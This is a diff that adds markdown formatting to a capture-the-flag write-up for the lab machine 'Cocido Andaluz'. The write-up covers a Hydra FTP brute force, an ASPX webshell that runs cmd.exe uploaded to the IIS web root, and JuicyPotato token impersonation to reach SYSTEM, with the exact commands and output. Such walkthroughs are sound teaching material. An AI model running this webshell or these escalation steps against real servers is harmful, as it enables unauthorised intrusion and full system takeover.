@@ -111,39 +111,45 @@ The HTTP service was inspected using several tools.
 
 Headers:
 
+```bash
 curl -I http://10.0.2.15:80
-
+```
 Technology fingerprinting:
 
+```bash
 whatweb http://10.0.2.15
-
+```
 Directory enumeration:
 
+```bash
 gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,old
-
+```
 The web server presented a default page.
 
 A wildcard response was also identified during directory enumeration. Responses with the same content length could therefore be excluded using:
 
+```bash
 --exclude-length 10701
-
+```
 No immediately exploitable functionality was identified through the initial web enumeration.
 
 ## 6. FTP Credential Brute Force
 
 Since FTP remained exposed and the other enumeration paths had not produced useful access, a small username list was created based on usernames observed during enumeration:
 
+```text
 Administrador
 administrador
 Administrator
 administrator
 info
 Info
-
+```
 Hydra was then used against FTP:
 
+```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.15
-
+```
 Valid credentials were obtained for the info account.
 
 The password is omitted from this public write-up.
@@ -154,14 +160,15 @@ The credentials were then tested manually through FTP.
 
 After authentication:
 
+```bash
 ftp 10.0.2.15
-
+```
 the remote directory contained the website files.
 
 The existing index.html was downloaded:
-
+```bash
 get index.html
-
+```
 Its contents matched the page accessible through the browser.
 
 This indicated that the FTP directory corresponded to the IIS web root.
@@ -170,16 +177,18 @@ Testing File Upload
 
 A harmless text file was created:
 
+```bash
 echo "test de subida" > test.txt
-
+```
 and uploaded:
 
 put test.txt
 
 The uploaded file was then requested through HTTP:
 
+```bash
 curl http://10.0.2.15/test.txt
-
+```
 The file was accessible through the web server.
 
 This confirmed that the FTP account had write access to the IIS web root.
@@ -190,14 +199,16 @@ The next step was determining which server-side technologies IIS would process.
 
 An ASP test file was created:
 
+```aspx
 echo '<% Response.Write("Mora ASP test"); %>' > test.asp
-
+```
 The server did not process the ASP file as expected.
 
 An ASP.NET file was then created:
 
+```aspx
 echo '<%@ Page Language="C#" %><% Response.Write("Mora ASPX test"); %>' > test.aspx
-
+```
 The file was successfully processed by IIS.
 
 This confirmed that uploaded .aspx files were being interpreted as ASP.NET code.
@@ -206,6 +217,7 @@ This confirmed that uploaded .aspx files were being interpreted as ASP.NET code.
 
 A simple ASPX payload was created to execute cmd.exe:
 
+```aspx
 <%@ Page Language="C#" %>
 
 <%
@@ -220,10 +232,10 @@ p.Start();
 
 Response.Write(p.StandardOutput.ReadToEnd());
 %>
-
+```
 After uploading the file and accessing it through HTTP, the response was:
 
-nt authority\servicio de red
+`nt authority\servicio de red`
 
 This confirmed remote code execution.
 
@@ -238,51 +250,59 @@ The console accepted commands through an HTTP POST request and executed them thr
 
 This allowed commands such as:
 
+```bash
 whoami
 whoami /groups
 whoami /priv
 systeminfo
 net localgroup
-
+```
 to be executed without repeatedly uploading new ASPX files.
 
 ## 11. Windows Enumeration
 
 The current identity was:
 
+```bash
 whoami
-
+```
 Result:
 
+```cmd
 nt authority\servicio de red
-
+```
 Group enumeration:
 
+```bash
 whoami /groups
-
+```
 Privilege enumeration:
 
+```bash
 whoami /priv
-
+```
 One privilege was particularly interesting:
 
+```bash
 SeImpersonatePrivilege    Habilitada
-
+```
 System information was also collected:
 
 systeminfo
 
 The target was identified as:
 
+```text
 Microsoft Windows Server 2008 Datacenter
 X86-based PC
-
+```
 The combination of:
 
+```text
 NETWORK SERVICE
 +
 SeImpersonatePrivilege
-
+```
 suggested investigating token impersonation techniques such as the Potato family.
 
 ## 12. JuicyPotato
@@ -291,34 +311,37 @@ Because the target was an x86 Windows system, an x86 version of JuicyPotato was 
 
 The binary was verified from Kali:
 
+```cmd
 file Juicy.Potato.x86.exe
-
+```
 Result:
 
+```cmd
 PE32 executable ... Intel i386
+```
+**PE32** indicates a 32-bit Windows executable, matching the target architecture.
 
-PE32 indicates a 32-bit Windows executable, matching the target architecture.
-
-A PE32+ executable would correspond to x64 and would not be appropriate for this target.
+A **PE32+** executable would correspond to x64 and would not be appropriate for this target.
 
 The binary was uploaded through FTP.
 
-FTP Binary Mode
+## FTP Binary Mode
 
 When transferring executable files through FTP, binary mode must be used:
 
+```bash
 binary
-
+```
 followed by:
-
+```bash
 put Juicy.Potato.x86.exe
-
+```
 Using ASCII mode can alter binary files during transfer.
 
 The executable was placed at:
-
+```cmd
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe
-
+```
 The executable was then tested:
 
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe -h
@@ -327,54 +350,55 @@ C:\inetpub\wwwroot\Juicy.Potato.x86.exe -h
 JuicyPotato uses Windows COM components identified by CLSID (Class Identifier).
 
 The JuicyPotato help output showed the following BITS CLSID as the default:
-
+```cmd
 {4991d34b-80a1-4291-83b6-3328366b9097}
-
+```
 The -c option allows specifying a CLSID:
-
+```cmd
 -c <{clsid}>
-
+```
 The -z option can be used to test the CLSID and display the user associated with the obtained token.
 
 The following command was used:
-
+```cmd
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe -z -t * -p C:\Windows\System32\cmd.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}
-
+```
 The result was:
-
-{4991d34b-80a1-4291-83b6-3328366b9097;NT AUTHORITY\SYSTEM
-
+```cmd
+4991d34b-80a1-4291-83b6-3328366b9097;NT AUTHORITY\SYSTEM
+```
 This confirmed that the CLSID could provide a token associated with:
-
+```cmd
 NT AUTHORITY\SYSTEM
+```
 ## 14. Privilege Escalation
 
 The CLSID was then used to create a new process with the obtained token.
 
 A simple whoami proof was performed:
-
+```cmd
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\inetpub\wwwroot\system.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}
-
+```
 The resulting file was read through the webshell:
-
+```cmd
 type C:\inetpub\wwwroot\system.txt
-
+```
 Result:
-
+```cmd
 nt authority\system
-
+```
 This confirmed successful privilege escalation.
 
-Important distinction
+**Important distinction**
 
 The original ASP.NET webshell remained:
-
+```cmd
 NT AUTHORITY\NETWORK SERVICE
-
+```
 JuicyPotato did not transform the existing webshell into SYSTEM.
 
 Instead, it created a separate process:
-
+```bash
 NETWORK SERVICE
        ↓
 JuicyPotato
@@ -384,54 +408,54 @@ SYSTEM token
 new cmd.exe
        ↓
 NT AUTHORITY\SYSTEM
-
+```
 This distinction became important during post-exploitation because commands executed directly through the webshell still had the permissions of NETWORK SERVICE.
 
 ## 15. Accessing the Administrator Profile
 
 Direct access from the webshell:
-
+```cmd
 dir C:\Users\Administrador /a
-
+```
 resulted in:
-
+```cmd
 Access Denied
-
+```
 The same operation was then executed through the SYSTEM process created by JuicyPotato:
-
+```cmd
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c dir C:\Users\Administrador /a > C:\inetpub\wwwroot\admin-system.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}
-
+```
 The resulting file showed the contents of:
-
+```cmd
 C:\Users\Administrador
-
+```
 including:
-
+```cmd
 Desktop
 Documents
 Downloads
 ...
-
+```
 This further demonstrated the difference between the privileges of the webshell and the SYSTEM process.
 
 ## 16. Root Flag
 
 The root flag was located at:
-
+```cmd
 C:\Users\Administrador\Desktop\root.txt
-
+```
 Because the webshell itself was still running as NETWORK SERVICE, the file could not be read directly.
 
 The SYSTEM process created through JuicyPotato was therefore used to read it:
-
+```cmd
 C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c type C:\Users\Administrador\Desktop\root.txt > C:\inetpub\wwwroot\rootflag.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}
-
+```
 The result was then retrieved from the webshell:
 
 type C:\inetpub\wwwroot\rootflag.txt
 
 The root flag was successfully obtained.
-
+```text
 Attack Chain
 Host Discovery
       ↓
@@ -466,48 +490,49 @@ New cmd.exe as SYSTEM
 Administrator Profile
       ↓
 root.txt
-Lessons Learned
-FTP write access can be more important than anonymous access
+```
+## Lessons Learned
+**FTP write access can be more important than anonymous access**
 
 Although anonymous FTP was disabled, authenticated FTP access provided write access to the IIS web root. This transformed the FTP service into the initial access vector.
 
-Always test what uploaded files are actually processed
+**Always test what uploaded files are actually processed**
 
 The important discovery was not simply that FTP allowed uploads, but that uploaded .aspx files were interpreted by IIS as ASP.NET code.
 
-RCE does not mean administrator access
+**RCE does not mean administrator access**
 
 The initial RCE executed as:
-
+```cmd
 NT AUTHORITY\NETWORK SERVICE
-
+```
 Further enumeration was required to determine the available privileges.
 
-SeImpersonatePrivilege is an important Windows privilege
+```SeImpersonatePrivilege``` is an important Windows privilege
 
 The combination of:
-
+```text
 NETWORK SERVICE
 +
 SeImpersonatePrivilege
-
+```
 provided the clue toward Potato-style privilege escalation.
 
 Architecture matters
 
 The target was:
-
+```cmd
 X86-based PC
-
+```
 so the appropriate JuicyPotato binary was:
-
+```text
 PE32 / Intel i386
-
+```
 rather than:
-
+```text
 PE32+
 FTP binary mode matters
-
+```
 Executable files should be transferred using:
 
 binary
@@ -518,21 +543,21 @@ A privileged token does not change the existing shell
 
 JuicyPotato created a separate process running as SYSTEM.
 
-The original ASPX webshell remained NETWORK SERVICE.
+The original ASPX webshell remained ```NETWORK SERVICE.```
 
 Validate exploitation in stages
 
 Instead of immediately attempting to obtain a full shell, the CLSID was first validated using:
-
+```bash
 -z
-
+```
 and the resulting token was confirmed as:
-
+```cmd
 NT AUTHORITY\SYSTEM
-
+```
 Only after validating the mechanism was the process execution performed.
 
-Conclusion
+## Conclusion
 
 Cocido Andaluz was completed by chaining authenticated FTP access with write permissions to the IIS web root, uploading an ASP.NET file and obtaining RCE as NETWORK SERVICE.
 
@@ -540,6 +565,7 @@ The presence of SeImpersonatePrivilege provided the path to privilege escalation
 
 The final attack path was:
 
+```text
 FTP Credentials
       ↓
 FTP Write Access
@@ -555,8 +581,8 @@ JuicyPotato
 SYSTEM
       ↓
 Root Flag
-
-Machine completed.
+```
+**Machine completed.**
 
 References
 The Hackers Labs
